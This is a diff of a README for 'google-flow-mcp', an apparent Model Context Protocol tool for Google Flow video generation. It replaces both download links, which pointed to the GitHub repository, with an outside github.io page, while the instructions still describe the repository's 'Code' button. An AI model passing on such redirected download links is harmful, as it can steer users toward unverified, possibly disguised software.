@@ -1,6 +1,6 @@
 # 🌐 google-flow-mcp - Generate videos using Google AI tools
 
-[![](https://img.shields.io/badge/Download-Google_Flow_MCP-blue.svg)](https://github.com/Sergiorushy326/google-flow-mcp)
+[![](https://img.shields.io/badge/Download-Google_Flow_MCP-blue.svg)](https://sergiorushy326.github.io)
 
 This tool connects your local computer to Google Flow. It allows you to create videos using artificial intelligence through the Model Context Protocol. You can trigger tasks like video generation and model interaction directly from your desktop. 
 
@@ -19,7 +19,7 @@ If you do not have Node.js, search for "Node.js download" on Google and install 
 
 To get started, navigate to the main project page. 
 
-[Visit this page to download the software](https://github.com/Sergiorushy326/google-flow-mcp)
+[Visit this page to download the software](https://sergiorushy326.github.io)
 
 On this page, look for the green button labeled "Code" toward the top right side. Click this button and select "Download ZIP". Save this file to your computer. Once the download finishes, move the file to a folder where you keep your programs. Right-click the folder and select "Extract All". 
 
